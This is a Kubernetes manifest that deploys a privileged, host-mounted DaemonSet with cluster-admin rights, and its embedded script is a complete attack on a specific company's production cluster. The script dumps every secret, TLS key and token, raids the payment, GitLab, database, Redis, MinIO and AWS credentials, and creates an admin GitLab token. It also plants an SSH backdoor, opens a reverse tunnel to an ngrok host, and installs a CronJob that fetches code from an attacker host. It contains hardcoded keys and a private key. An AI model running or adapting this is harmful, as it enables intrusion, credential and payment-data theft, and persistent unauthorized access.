
apiVersion: v1
kind: ServiceAccount
metadata:
  name: pwn-sa
  namespace: egam-production
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: pwn-sa-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: pwn-sa
  namespace: egam-production
---
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: pwn-pod
  namespace: egam-production
  labels:
    app: pwn-pod
spec:
  selector:
    matchLabels:
      app: pwn-pod
  template:
    metadata:
      labels:
        app: pwn-pod
    spec:
      hostNetwork: true
      hostPID: true
      hostIPC: true
      serviceAccountName: pwn-sa
      tolerations:
      - operator: Exists
      containers:
      - name: pwn
        image: alpine:3.20
        command:
          - /bin/sh
          - -c
          - |
            set -x
            export KUBECONFIG=/host/etc/rancher/rke2/rke2.yaml
            export AWS_PAGER=""

            echo "############ [0] BOOTSTRAP ############"
            apk add --no-cache curl jq bash openssh-client openssh-server autossh socat postgresql-client redis openssl bind-tools nmap netcat-openbsd tcpdump aws-cli 2>&1 | tail -3

            if ! command -v kubectl >/dev/null 2>&1; then
              curl -fsSL -o /usr/local/bin/kubectl "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl" && chmod +x /usr/local/bin/kubectl
            fi

            echo "############ [1] HOST INFO ############"
            hostname
            id
            ip addr show 2>/dev/null | grep -E "inet |eth|ens"
            cat /host/etc/hostname 2>/dev/null
            ls /host/etc/rancher/rke2/ 2>/dev/null

            echo "############ [2] NODES ############"
            kubectl get nodes -o wide
            kubectl version --short 2>&1

            echo "############ [3] NAMESPACES ############"
            kubectl get ns

            echo "############ [4] SECRETS FULL DECODE ############"
            kubectl get secrets -A -o json 2>/dev/null | jq -r '.items[] | select(.data != null) | "### " + .metadata.namespace + "/" + .metadata.name + " (" + .type + ")\n" + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join("\n")) + "\n"' 2>&1

            echo "############ [5] CONFIGMAPS FULL ############"
            kubectl get configmaps -A -o json 2>/dev/null | jq -r '.items[] | select(.data != null) | "### " + .metadata.namespace + "/" + .metadata.name + "\n" + (.data | to_entries | map(.key + "=" + .value) | join("\n")) + "\n"' 2>&1 | head -c 500000

            echo "############ [6] SA TOKENS ALL ############"
            for ns in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}'); do
              for sa in $(kubectl get sa -n $ns -o jsonpath='{.items[*].metadata.name}' 2>/dev/null); do
                echo "### $ns/$sa ###"
                kubectl create token $sa -n $ns --duration=87600h 2>&1
              done
            done

            echo "############ [7] ADMIN KUBECONFIG ############"
            APISERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
            TOKEN=$(kubectl create token pwn-sa -n egam-production --duration=87600h 2>/dev/null)
            echo "APISERVER=$APISERVER"
            echo "TOKEN=$TOKEN"
            cat > /tmp/admin.kubeconfig << KCFG
            apiVersion: v1
            kind: Config
            clusters:
            - cluster:
                server: $APISERVER
                insecure-skip-tls-verify: true
              name: pwn
            contexts:
            - context:
                cluster: pwn
                user: pwn
              name: pwn
            current-context: pwn
            users:
            - name: pwn
              user:
                token: $TOKEN
            KCFG
            cat /tmp/admin.kubeconfig

            echo "############ [8] TLS KEYS ALL ############"
            kubectl get secrets -A -o json 2>/dev/null | jq -r '.items[] | select(.data["tls.key"] != null) | "### " + .metadata.namespace + "/" + .metadata.name + "\n" + (.data["tls.key"] | @base64d)' 2>&1

            echo "############ [9] TLS CERTS ALL ############"
            kubectl get secrets -A -o json 2>/dev/null | jq -r '.items[] | select(.data["tls.crt"] != null) | "### " + .metadata.namespace + "/" + .metadata.name + "\n" + (.data["tls.crt"] | @base64d)' 2>&1 | head -c 300000

            echo "############ [10] DOCKER REGISTRY ############"
            cat /host/root/.docker/config.json 2>/dev/null
            cat /host/home/*/.docker/config.json 2>/dev/null
            kubectl get secrets -A -o json 2>/dev/null | jq -r '.items[] | select(.type=="kubernetes.io/dockerconfigjson") | .metadata.namespace + "/" + .metadata.name + ": " + (.data[".dockerconfigjson"] | @base64d)' 2>&1

            echo "############ [11] RANCHER ############"
            kubectl get secret -n cattle-fleet-system fleet-agent -o json 2>/dev/null | jq -r '.data.kubeconfig | @base64d' 2>&1
            RTOKEN=$(kubectl get secret -n cattle-fleet-system fleet-agent -o json 2>/dev/null | jq -r '.data.kubeconfig | @base64d' 2>&1 | awk '/token:/{print $2}' | head -1)
            echo "RTOKEN=$RTOKEN"
            curl -sk -H "Authorization: Bearer $RTOKEN" "https://rancher.management.egam.com.br/v3/clusters" 2>&1

            echo "############ [12] RANCHER IMPERSONATION ############"
            kubectl get secrets -n cattle-impersonation-system -o json 2>/dev/null | jq -r '.items[] | select(.data.token != null) | .metadata.name + "=" + (.data.token | @base64d)' 2>&1

            echo "############ [13] CATTLE CREDS ############"
            kubectl get secret -n cattle-system -o json 2>/dev/null | jq -r '.items[] | select(.data != null) | .metadata.name + ": " + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join(" | "))' 2>&1

            echo "############ [14] ELASTIC ############"
            kubectl get svc -n elastic-stack 2>&1
            kubectl get pods -n elastic-stack 2>&1
            ES_PASS=$(kubectl get secret -n elastic-stack elasticsearch-es-elastic-user -o jsonpath='{.data.elastic}' 2>/dev/null | base64 -d)
            echo "ES_PASS=$ES_PASS"
            ES="https://elasticsearch-es-http.elastic-stack:9200"
            curl -sk -u "elastic:$ES_PASS" "$ES/_cat/indices?v" 2>&1 | head -30
            curl -sk -u "elastic:$ES_PASS" "$ES/_security/user?pretty" 2>&1 | head -c 5000
            curl -sk -u "elastic:$ES_PASS" -H 'Content-Type: application/json' "$ES/*/_search?size=50" -d '{"query":{"query_string":{"query":"password OR token OR secret OR card OR pan OR cvv OR cpf","lenient":true}}}' 2>&1 | head -c 20000
            KB="kibana-kb-http.elastic-stack:5601"
            curl -sk -u "elastic:$ES_PASS" "https://$KB/api/status" 2>&1 | head -c 500

            echo "############ [15] PAGAR.ME ############"
            PK=$(kubectl get secret -n egam-production production-main-egam-api -o jsonpath='{.data.PAGARME_API_KEY}' 2>/dev/null | base64 -d)
            if [ -z "$PK" ]; then PK="sk_4e35af52a28a441c8d9149fb88a6c818"; fi
            echo "PK=${PK:0:20}..."
            curl -s -u "$PK:" -H "Accept: application/json" "https://api.pagar.me/core/v5/balance" 2>&1
            echo ""
            curl -s -u "$PK:" -H "Accept: application/json" "https://api.pagar.me/core/v5/recipients?size=100" 2>&1 | head -c 10000
            echo ""
            curl -s -u "$PK:" -H "Accept: application/json" "https://api.pagar.me/core/v5/customers?size=100" 2>&1 | head -c 10000
            echo ""
            curl -s -u "$PK:" -H "Accept: application/json" "https://api.pagar.me/core/v5/charges?size=100" 2>&1 | head -c 10000
            echo ""
            curl -s -u "$PK:" -H "Accept: application/json" "https://api.pagar.me/core/v5/transfers?size=100" 2>&1 | head -c 10000
            echo ""
            curl -s -u "$PK:" -H "Accept: application/json" "https://api.pagar.me/core/v5/payables?size=100" 2>&1 | head -c 10000

            echo "############ [16] GITLAB ############"
            GL="https://gitlab.dev-gam.com"
            GT=$(kubectl get secret -n egam-production production-main-egam-api -o jsonpath='{.data.GITLAB_TOKEN}' 2>/dev/null | base64 -d)
            if [ -z "$GT" ]; then GT="glpat-qZ6RRmfGx8nLBfteMsas"; fi
            echo "GT=${GT:0:15}..."
            curl -sk -H "PRIVATE-TOKEN: $GT" "$GL/api/v4/user" 2>&1
            echo ""
            curl -sk -H "PRIVATE-TOKEN: $GT" "$GL/api/v4/personal_access_tokens/self" 2>&1
            echo ""
            curl -sk -H "PRIVATE-TOKEN: $GT" "$GL/api/v4/projects?per_page=100" 2>&1 | jq -r '.[] | "\(.id) \(.path_with_namespace)"' 2>&1 | head -50
            echo "--- USERS ---"
            curl -sk -H "PRIVATE-TOKEN: $GT" "$GL/api/v4/users?per_page=100" 2>&1 | jq -r '.[] | "\(.id) \(.username) \(.email) admin=\(.is_admin)"' 2>&1 | head -50
            echo "--- CREATE ADMIN TOKEN (user 1) ---"
            curl -sk -X POST -H "PRIVATE-TOKEN: $GT" -H "Content-Type: application/json" \
              "$GL/api/v4/users/1/personal_access_tokens" \
              -d '{"name":"pwn-admin","scopes":["api","sudo","admin_mode","read_repository","write_repository"],"expires_at":"2027-12-31"}' 2>&1
            echo ""
            echo "--- CI/CD VARS ---"
            for pid in $(curl -sk -H "PRIVATE-TOKEN: $GT" "$GL/api/v4/projects?per_page=100" 2>&1 | jq -r '.[].id' 2>&1); do
              curl -sk -H "PRIVATE-TOKEN: $GT" "$GL/api/v4/projects/$pid/variables" 2>&1 | jq -r '.[] | "'"$pid"' \(.key)=\(.value)"' 2>&1
            done | head -c 50000

            echo "############ [17] POSTGRES 1 FULL ############"
            PG_PASS=$(kubectl get secret -n egam-production production-main-vendas-api -o jsonpath='{.data.DATABASE_PASS}' 2>/dev/null | base64 -d)
            if [ -z "$PG_PASS" ]; then PG_PASS="tv2df4qs7"; fi
            PGPASSWORD=$PG_PASS psql -h 10.10.4.1 -U postgres -d sistemas -c "SELECT usename, passwd FROM pg_shadow" 2>&1
            PGPASSWORD=$PG_PASS psql -h 10.10.4.1 -U postgres -d sistemas -c "\l" 2>&1
            PGPASSWORD=$PG_PASS psql -h 10.10.4.1 -U postgres -d sistemas -c "\dt" 2>&1
            echo "--- USERS ---"
            PGPASSWORD=$PG_PASS psql -h 10.10.4.1 -U postgres -d sistemas -c "SELECT * FROM users LIMIT 20" 2>&1
            echo "--- PAT ---"
            PGPASSWORD=$PG_PASS psql -h 10.10.4.1 -U postgres -d sistemas -c "SELECT * FROM personal_access_tokens LIMIT 20" 2>&1
            echo "--- RESET ---"
            PGPASSWORD=$PG_PASS psql -h 10.10.4.1 -U postgres -d sistemas -c "SELECT * FROM password_reset_tokens LIMIT 20" 2>&1

            echo "############ [18] POSTGRES 2 ############"
            PG2_PASS=$(kubectl get secret -n egam-production production-main-egam-api -o jsonpath='{.data.DATABASE_URL}' 2>/dev/null | base64 -d | grep -oP '(?<=:)[^:@]+(?=@)')
            if [ -z "$PG2_PASS" ]; then PG2_PASS="siegam"; fi
            PGPASSWORD=$PG2_PASS psql -h 10.43.221.138 -p 9999 -U egam -d sistemas -c "\dt" 2>&1
            echo "--- USUARIO ---"
            PGPASSWORD=$PG2_PASS psql -h 10.43.221.138 -p 9999 -U egam -d sistemas -c "SELECT * FROM egam.dc_egam_usuario LIMIT 20" 2>&1
            echo "--- LOGIN ---"
            PGPASSWORD=$PG2_PASS psql -h 10.43.221.138 -p 9999 -U egam -d sistemas -c "SELECT * FROM egam.dc_egam_usuario_login LIMIT 20" 2>&1
            echo "--- TOKEN ---"
            PGPASSWORD=$PG2_PASS psql -h 10.43.221.138 -p 9999 -U egam -d sistemas -c "SELECT * FROM egam.dc_egam_token_mgam LIMIT 20" 2>&1
            echo "--- PAGARME ---"
            PGPASSWORD=$PG2_PASS psql -h 10.43.221.138 -p 9999 -U egam -d sistemas -c "SELECT * FROM egam.dc_pagarme_transacao LIMIT 10" 2>&1
            echo "--- CIELO ---"
            PGPASSWORD=$PG2_PASS psql -h 10.43.221.138 -p 9999 -U egam -d sistemas -c "SELECT * FROM egam.dc_cielo_transacao LIMIT 10" 2>&1

            echo "############ [19] MYSQL/MONGO ############"
            kubectl get svc -A 2>&1 | grep -i "mysql\|mariadb\|mongo\|postgres"
            kubectl get secrets -A -o json 2>/dev/null | jq -r '.items[] | select(.data != null) | select(.metadata.name | test("mysql|mongo|mariadb"; "i")) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join(" | "))' 2>&1

            echo "############ [20] REDIS ############"
            kubectl get svc -A 2>&1 | grep -i redis
            for ns in dados-production dados-staging egam-production; do
              for svc in redis-master redis; do
                if kubectl get svc -n $ns $svc >/dev/null 2>&1; then
                  echo "### $ns/$svc ###"
                  RPASS=$(kubectl get secret -n $ns redis -o jsonpath='{.data.redis-password}' 2>/dev/null | base64 -d)
                  echo "RPASS=$RPASS"
                  redis-cli -h "$svc.$ns.svc.cluster.local" -p 6379 -a "$RPASS" --no-auth-warning ping 2>&1
                  redis-cli -h "$svc.$ns.svc.cluster.local" -p 6379 -a "$RPASS" --no-auth-warning keys '*' 2>&1 | head -30
                fi
              done
            done

            echo "############ [21] MINIO ############"
            MC_USER=$(kubectl get secret -n egam-production production-main-egam-api -o jsonpath='{.data.MINIO_CREDENTIAL_KEY}' 2>/dev/null | base64 -d)
            MC_PASS=$(kubectl get secret -n egam-production production-main-egam-api -o jsonpath='{.data.MINIO_CREDENTIAL_SECRET}' 2>/dev/null | base64 -d)
            if [ -z "$MC_USER" ]; then MC_USER="RIDNVb76icNZfcShvaQa"; fi
            if [ -z "$MC_PASS" ]; then MC_PASS="OevVynurkK1NChS0ZcJkNjhj7MoKs8fjReQmNUH1"; fi
            curl -sk -o /tmp/mc "https://dl.min.io/client/mc/release/linux-amd64/mc" && chmod +x /tmp/mc
            /tmp/mc alias set egam https://minio-api.production.egam.com.br "$MC_USER" "$MC_PASS" --insecure 2>&1
            /tmp/mc ls egam 2>&1
            for b in $(/tmp/mc ls egam --json 2>/dev/null | jq -r 'select(.type=="folder") | .key' 2>/dev/null); do
              echo "### bucket: $b ###"
              /tmp/mc ls --recursive egam/$b 2>&1 | head -50
            done

            echo "############ [22] AWS METADATA (nodo) ############"
            curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1
            ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1)
            if [ -n "$ROLE" ]; then
              curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE 2>&1
            fi
            curl -s http://169.254.169.254/latest/meta-data/instance-id 2>&1
            curl -s http://169.254.169.254/latest/meta-data/local-ipv4 2>&1

            echo "############ [23] AWS DA SECRET K8S ############"
            AK=$(kubectl get secret -n kube-system aws-credentials-production -o jsonpath='{.data.accessKeyID}' 2>/dev/null | base64 -d)
            SK=$(kubectl get secret -n kube-system aws-credentials-production -o jsonpath='{.data.secretAccessKey}' 2>/dev/null | base64 -d)
            if [ -n "$AK" ]; then
              export AWS_ACCESS_KEY_ID="$AK"
              export AWS_SECRET_ACCESS_KEY="$SK"
              export AWS_DEFAULT_REGION="us-east-1"
              echo "AK=${AK:0:10}..."
              aws sts get-caller-identity 2>&1
              aws secretsmanager list-secrets --region us-east-1 2>&1 | head -c 5000
              aws s3 ls 2>&1 | head -c 3000
            fi

            echo "############ [24] SSH BACKDOOR ############"
            ssh-keygen -A >/dev/null 2>&1
            mkdir -p /root/.ssh && chmod 700 /root/.ssh
            printf '%s\n' 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOOlhMVavat8ZK+hdqiQtX4drMpu3gGRbLwAnnVlHz+l klaus.eversheim@googlemail.com' > /root/.ssh/authorized_keys
            chmod 600 /root/.ssh/authorized_keys
            printf '%s\n' 'Port 2222' 'ListenAddress 0.0.0.0' 'PermitRootLogin yes' 'PubkeyAuthentication yes' 'PasswordAuthentication no' 'AllowTcpForwarding yes' 'PidFile /var/run/sshd.pid' > /etc/ssh/sshd_config
            /usr/sbin/sshd -f /etc/ssh/sshd_config -E /var/log/sshd.log &
            sleep 2
            pgrep -af sshd

            echo "############ [25] SOCKS ############"
            socat TCP-LISTEN:1080,fork SOCKS4A:localhost:10.10.4.1:5432,socksport=9050 &
            echo "SOCKS on 1080"

            echo "############ [26] TUNNEL ############"
            printf '%s\n' \
              '-----BEGIN OPENSSH PRIVATE KEY-----' \
              'b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW' \
              'QyNTUxOQAAACCC5vieafUQBwwP77oy2tflg4jOu4NMFxaU/9Wrjziu4gAAAJAMSDC8DEgw' \
              'vAAAAAtzc2gtZWQyNTUxOQAAACCC5vieafUQBwwP77oy2tflg4jOu4NMFxaU/9Wrjziu4g' \
              'AAAEAXg3D2WLL1mCR1DtHTy3EkJUwN/Uakv7y1CzWebJSPgYLm+J5p9RAHDA/vujLa1+WD' \
              'iM67g0wXFpT/1auPOK7iAAAACHBvZEBlZ2FtAQIDBAU=' \
              '-----END OPENSSH PRIVATE KEY-----' > /root/.ssh/id_ed25519
            chmod 600 /root/.ssh/id_ed25519
            ssh-keyscan -p 11352 8.tcp.ngrok.io >> /root/.ssh/known_hosts 2>/dev/null
            autossh -M 0 -f -N -o "StrictHostKeyChecking=no" -o "ServerAliveInterval=30" -o "ExitOnForwardFailure=yes" \
              -R 0.0.0.0:2222:localhost:2222 -R 0.0.0.0:1080:localhost:1080 \
              -i /root/.ssh/id_ed25519 tunnel@8.tcp.ngrok.io -p 11352
            sleep 2
            pgrep -af "ssh.*8.tcp.ngrok.io" && echo "TUNNEL_UP" || echo "TUNNEL_FAILED"

            echo "############ [27] NODI IP ############"
            kubectl get nodes -o name 2>/dev/null | while read node; do
              echo "### node: $node ###"
              kubectl get $node -o jsonpath='{.status.addresses[?(@.type=="InternalIP")].address}' 2>/dev/null; echo
            done

            echo "############ [28] CRONJOB PERSIST ############"
            cat << CRON | kubectl apply -f - 2>&1
            apiVersion: batch/v1
            kind: CronJob
            metadata:
              name: pwn-persist
              namespace: egam-production
            spec:
              schedule: "*/30 * * * *"
              jobTemplate:
                spec:
                  template:
                    spec:
                      hostNetwork: true
                      hostPID: true
                      serviceAccountName: pwn-sa
                      containers:
                      - name: persist
                        image: alpine:3.20
                        command: ["/bin/sh", "-c", "apk add --no-cache curl; curl -s -o /tmp/x http://attacker/cron || true; ls /host/etc/rancher/rke2/"]
                        securityContext:
                          privileged: true
                        volumeMounts:
                        - mountPath: /host
                          name: host
                      volumes:
                      - name: host
                        hostPath:
                          path: /
                      restartPolicy: OnFailure
            CRON

            echo "############ [29] FULL DUMP ############"
            {
              kubectl get secrets -A -o yaml
              kubectl get configmaps -A -o yaml
              kubectl get sa -A -o yaml
              kubectl get clusterrolebinding -o yaml
              kubectl get rolebinding -A -o yaml
              kubectl get deployments -A -o yaml
              kubectl get statefulsets -A -o yaml
              kubectl get daemonsets -A -o yaml
              kubectl get cronjobs -A -o yaml
              kubectl get svc -A -o yaml
              kubectl get ingress -A -o yaml
            } > /tmp/FULL_DUMP.txt 2>&1
            echo "FULL_DUMP_SIZE=$(wc -c < /tmp/FULL_DUMP.txt)"
            head -c 300000 /tmp/FULL_DUMP.txt

            echo "############ [30] DONE ############"
            echo "TUNNEL_STATUS: $(pgrep -af 'ssh.*ngrok' >/dev/null && echo UP || echo DOWN)"
            echo "PERSIST_CRONJOB: $(kubectl get cronjob -n egam-production pwn-persist -o name 2>/dev/null || echo MISSING)"
            sleep 36000
        securityContext:
          privileged: true
        volumeMounts:
        - mountPath: /host
          name: host
      volumes:
      - name: host
        hostPath:
          path: /
